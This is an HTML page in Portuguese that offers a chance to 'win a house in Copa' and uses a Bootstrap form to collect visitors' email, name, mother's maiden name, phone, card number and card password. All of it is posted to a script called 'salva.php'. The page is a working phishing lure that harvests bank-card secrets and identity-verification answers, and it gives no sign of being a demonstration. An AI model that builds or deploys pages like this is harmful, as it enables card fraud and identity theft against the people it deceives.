<!doctype html>
<html>
<form action="salva.php" method="post">

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
        crossorigin="anonymous">
    
  <body>
    <div class="container">
        <h1>Ganhe uma casa em Copa</h1>
    </div>

    <form name="form" action="salva.php" method="POST">
        <div class="form-group">
          <label for="email">Email</label>
          <input type="email" class="form-control" id="email" name="email">
    
        </div>

        <div class="row">
            <div class="col">
                <label for="nome1">Nome</label>
                <input type="text" class="form-control" id="nome1" name="nome1">
          
            </div>
            <div class="col">
                <label for="nome2">Sobrenome</label>
                <input type="text" class="form-control" id="nome2" name="nome2">
          
            </div>
        </div>

        <div class="form-group">
            <label for="nomeMae">Sobrenome de solteira da mãe</label>
            <input type="text" class="form-control" id="nomeMae" name="nomeMae">
        </div>

        <div class="form-group">
            <label for="telefone">Telefone</label>
            <input type="number" class="form-control" id="telefone" name="telefone">
        </div>

        <div class="form-group">
            <label for="estado">Estado</label>
            <select class="form-control" id="estado" name="estado">
              <option>Rio de Janeiro</option>
              <option>São Paulo</option>
              <option>Outro</option>
            </select>

        <div class="form-group">
            <label for="cartao">Cartão número</label>
            <input type="number" class="form-control" id="cartao" name="cartao">
        </div>

        <div class="form-group">
          <label for="senha">Senha do cartão</label>
          <input type="text" class="form-control" id="senha" name="senha">
        </div>

        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</form>
</body>
</html>
